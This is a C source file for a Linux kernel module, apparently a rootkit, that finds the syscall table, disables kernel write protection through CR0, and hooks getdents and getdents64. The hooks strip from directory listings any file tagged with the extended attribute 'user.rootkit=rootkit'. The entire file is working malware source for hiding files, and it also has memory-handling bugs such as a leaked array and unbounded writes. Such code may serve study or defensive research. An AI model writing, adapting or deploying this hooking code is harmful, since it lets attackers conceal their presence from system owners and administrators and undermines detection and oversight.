#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/xattr.h>
#include <linux/fs.h>
#include <linux/fdtable.h>

#include "common.h"
#include "hook.h"

#define SIZE 512

void **sys_calls;

asmlinkage long (*sys_getdents)(const struct pt_regs *);
asmlinkage long (*sys_getdents64)(const struct pt_regs *);

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

int
retrieve_sys_call_table(void)
{
    return NULL == (sys_calls
        = (void **)kallsyms_lookup_name("sys_call_table"));
}

void
init_hooks(void)
{
    sys_getdents = (void *)sys_calls[__NR_getdents];
    sys_getdents64 = (void *)sys_calls[__NR_getdents64];

    disable_protection();
    sys_calls[__NR_getdents] = (unsigned long) g7_getdents;
    sys_calls[__NR_getdents64] = (unsigned long) g7_getdents64;
    enable_protection();
}

void
remove_hooks(void)
{
    disable_protection();
    sys_calls[__NR_getdents] = sys_getdents;
    sys_calls[__NR_getdents64] = sys_getdents64;
    enable_protection();
}

void
disable_protection(void)
{
    write_cr0(read_cr0() & (~0x10000));
}

void
enable_protection(void)
{
    write_cr0(read_cr0() | 0x10000);
}


static bool
must_hide(struct dentry *dentry)
{
    char buf[SIZE];
    vfs_getxattr(dentry, "user.rootkit", buf, SIZE);
    return !strcmp("rootkit", buf);
}


static int
g7_compare_inodes(unsigned long inode, unsigned long *ino_array, int ino_count)
{
    for(int i = 0; i < ino_count; i++)
        if(inode == ino_array[i])
            return 1;

    return 0;
}


// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
asmlinkage long
g7_getdents(const struct pt_regs *pt_regs)
{
    typedef struct linux_dirent *dirent_t_ptr;

    unsigned long offset;
    dirent_t_ptr kdirent, cur_kdirent, prev_kdirent;
    struct dentry *kdirent_dentry;
    struct inode *kdirent_inode;

    cur_kdirent = prev_kdirent = NULL;
    int fd = (int)pt_regs->di;
    dirent_t_ptr dirent = (dirent_t_ptr)pt_regs->si;
    long ret = sys_getdents(pt_regs);

    if (ret <= 0 || !(kdirent = (dirent_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
    kdirent_inode = kdirent_dentry->d_inode;

    //Store all inode numbers that have xattrs set
    //TODO better implementation, a limit of 256 is stupid (or is it?)
    unsigned long *ino_array;
    int ino_count;
    ino_array = kmalloc(256 * sizeof(unsigned long), GFP_KERNEL);
    ino_count = 0;

    // TODO
    struct list_head *i;
    list_for_each(i, &kdirent_dentry->d_subdirs) {
        struct dentry *child = list_entry(i, struct dentry, d_child);
        if(child && child->d_inode)
            if(!inode_permission(child->d_inode, MAY_READ)) {
                char* buf = kmalloc(256, GFP_KERNEL);
                ssize_t sz = vfs_getxattr(child, "user.rootkit", buf, 256);

                if(!strncmp("rootkit", buf, sz))
                    ino_array[ino_count++] = child->d_inode->i_ino;

                kfree(buf);
            }
    }

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);

        if (g7_compare_inodes(cur_kdirent->d_ino, ino_array, ino_count)) { // TODO: detect xattrs user.rootkit = rootkit
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);

yield:
    kfree(kdirent);
    return ret;
}

// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
asmlinkage long
g7_getdents64(const struct pt_regs *pt_regs)
{
    typedef struct linux_dirent64 *dirent64_t_ptr;

    bool musthide = false;

    unsigned long offset;
    dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
    struct dentry *kdirent_dentry;
    struct inode *kdirent_inode;

    cur_kdirent = prev_kdirent = NULL;
    int fd = (int)pt_regs->di;
    dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
    long ret = sys_getdents64(pt_regs);

    if (ret <= 0 || !(kdirent = (dirent64_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
    kdirent_inode = kdirent_dentry->d_inode;

    //musthide = must_hide(kdirent_dentry);
    //DEBUG_INFO("must hide from 64: %d", musthide);

    //Store all inode numbers that have xattrs set
    //TODO better implementation, a limit of 256 is stupid (or is it?)
    unsigned long *ino_array;
    int ino_count;
    ino_array = kmalloc(256 * sizeof(unsigned long), GFP_KERNEL);
    ino_count = 0;

    // TODO
    struct list_head *i;
    list_for_each(i, &kdirent_dentry->d_subdirs) {
        struct dentry *child = list_entry(i, struct dentry, d_child);
        if(child && child->d_inode)
            if(!inode_permission(child->d_inode, MAY_READ)) {
                char* buf = kmalloc(256, GFP_KERNEL);
                ssize_t sz = vfs_getxattr(child, "user.rootkit", buf, 256);

                if(!strncmp("rootkit", buf, sz))
                    ino_array[ino_count++] = child->d_inode->i_ino;

                kfree(buf);
            }
    }

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);

        if (g7_compare_inodes(cur_kdirent->d_ino, ino_array, ino_count)) { // TODO: detect xattrs user.rootkit = rootkit
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);

yield:
    kfree(ino_array);
    kfree(kdirent);
    return ret;
}
